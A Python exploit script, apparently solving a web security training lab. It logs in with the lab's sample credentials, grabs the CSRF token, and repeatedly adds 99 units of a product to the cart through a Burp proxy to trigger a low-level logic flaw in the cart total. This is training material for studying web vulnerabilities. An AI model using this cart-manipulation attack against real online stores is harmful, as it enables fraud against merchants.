from math import fabs
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import winsound

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def logic_flaw(url):
    # Login 
    s = requests.Session()
    r = s.get(url+'login', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    data = {
        'csrf':csrf,
        'username':'wiener',
        'password':'peter'
    }
    r2 = s.post(url+'login', data=data, verify=False, proxies=proxies)
    cart = {
        'productId':'1',
        'redir':'PRODUCT',
        'quantity':'99'
    }
    for i in range(0,500):
        r3 = s.post(url+'cart', data=cart, proxies=proxies, verify=False)
        r4 = s.get(url+'cart', proxies=proxies, verify=False)
        cartsoup = BeautifulSoup(r4.text, 'html.parser')
        total = cartsoup.find_all('th')[5]
        #print(cartsoup.prettify)
        print(total)
    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com ")
        sys.exit(-1)
    
    print('[-] Attempting low level logic exploit')
    exploit = logic_flaw(url)
    #print(exploit)